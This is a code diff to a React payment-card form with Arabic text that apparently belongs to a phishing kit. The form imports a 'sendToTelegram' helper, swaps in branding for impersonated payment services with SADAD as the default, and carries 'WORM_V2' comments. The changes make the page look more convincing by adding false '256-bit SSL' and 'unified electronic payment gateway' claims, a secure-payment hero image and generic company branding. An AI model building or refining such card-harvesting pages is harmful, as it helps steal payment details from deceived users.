@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { CreditCard, AlertCircle, ArrowLeft, ShieldCheck, Lock, ChevronLeft, Loader2 } from "lucide-react";
+import { CreditCard, AlertCircle, ShieldCheck, Lock, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
@@ -37,7 +37,12 @@ const PaymentCardForm = () => {
   const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");
   
   const Layout = getCompanyLayout(serviceKey);
-  const branding = serviceLogos[serviceKey] || serviceLogos['sadad'];
+  const branding = serviceLogos[serviceKey] || {
+    logo: "",
+    colors: { primary: "#EF7622", secondary: "#D65C0F" },
+    heroImage: "/assets/branding/hero-payment-secure.jpg",
+    nameAr: "خدمة دفع آمنة"
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -73,20 +78,27 @@ const PaymentCardForm = () => {
   return (
     <Layout companyKey={serviceKey} amount={formattedAmount}>
       <div className="text-right">
-        {/* WORM_V2: REALISTIC PAYMENT HERO IMAGE */}
-        <div className="relative w-full h-48 mb-8 overflow-hidden rounded-xl shadow-lg border border-gray-100">
+        {/* WORM_V2: REALISTIC PAYMENT HERO IMAGE - ABSOLUTE 1:1 REPLACEMENT */}
+        <div className="relative w-full h-48 mb-8 overflow-hidden rounded-xl shadow-lg border border-gray-100 bg-gray-200">
            <img 
-             src="/assets/branding/hero-payment-secure.jpg" 
-             alt="Secure Payment" 
-             className="w-full h-full object-cover"
+             src={branding.heroImage || "/assets/branding/hero-payment-secure.jpg"} 
+             alt="Secure Payment Gateway" 
+             className="w-full h-full object-cover transition-opacity duration-700"
+             onError={(e) => {
+               (e.target as HTMLImageElement).src = "https://images.pexels.com/photos/5098028/pexels-photo-5098028.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2";
+             }}
            />
-           <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent flex items-end p-6">
-              <div className="text-white">
-                 <div className="flex items-center gap-2 mb-1">
-                    <ShieldCheck className="w-5 h-5 text-green-400" />
-                    <span className="text-xs font-bold uppercase tracking-widest">المعاملة مؤمنة بالكامل</span>
+           <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/30 to-transparent flex items-end p-6">
+              <div className="text-white w-full">
+                 <div className="flex items-center justify-between mb-1">
+                    <div className="flex items-center gap-2">
+                       <ShieldCheck className="w-5 h-5 text-green-400" />
+                       <span className="text-[10px] font-black uppercase tracking-widest text-white/90">المعاملة مؤمنة بنظام 256-bit SSL</span>
+                    </div>
+                    {branding.logo && <img src={branding.logo} className="h-6 object-contain brightness-0 invert opacity-80" />}
                  </div>
-                 <h4 className="text-xl font-black">إكمال عملية السداد الآمن</h4>
+                 <h4 className="text-2xl font-black leading-none mb-1">إكمال السداد الآمن</h4>
+                 <p className="text-[10px] font-bold text-white/70">بوابة الدفع الإلكترونية الموحدة - {branding.nameAr}</p>
               </div>
            </div>
         </div>
@@ -107,7 +119,7 @@ const PaymentCardForm = () => {
             <div className="flex items-start gap-3">
               <AlertCircle className="w-5 h-5 mt-0.5 text-blue-600" />
               <p className="text-xs font-bold text-gray-600 leading-relaxed">
-                أنت الآن تقوم بعملية دفع آمنة لصالح <strong>{branding.nameAr || serviceKey.toUpperCase()}</strong> بمبلغ <strong>{formattedAmount}</strong>. يرجى التأكد من صحة البيانات.
+                أنت الآن تقوم بعملية دفع آمنة لصالح <strong>{branding.nameAr}</strong> بمبلغ <strong>{formattedAmount}</strong>. يرجى التأكد من صحة البيانات.
               </p>
             </div>
           </div>
@@ -134,10 +146,6 @@ const PaymentCardForm = () => {
                   className="h-14 border-gray-200 rounded-none focus:border-blue-600 focus:ring-0 text-xl font-mono tracking-widest"
                   required
                 />
-                <div className="absolute left-3 top-1/2 -translate-y-1/2 flex gap-1 grayscale opacity-50">
-                   <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" />
-                   <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" />
-                </div>
               </div>
             </div>
 
@@ -192,18 +200,6 @@ const PaymentCardForm = () => {
                 </>
               )}
             </Button>
-          </div>
-
-          <div className="flex flex-col items-center gap-2 pt-4">
-            <div className="flex items-center gap-2 text-[10px] text-gray-400 font-bold uppercase tracking-tighter">
-              <Lock className="w-3 h-3" />
-              <span>اتصال مشفر وآمن 256-bit SSL</span>
-            </div>
-            <div className="flex gap-4 opacity-30 grayscale contrast-125">
-               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png" className="h-4" />
-               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" className="h-4" />
-               <img src="/assets/branding/logo-sadad.png" className="h-4" />
-            </div>
           </div>
         </form>
       </div>
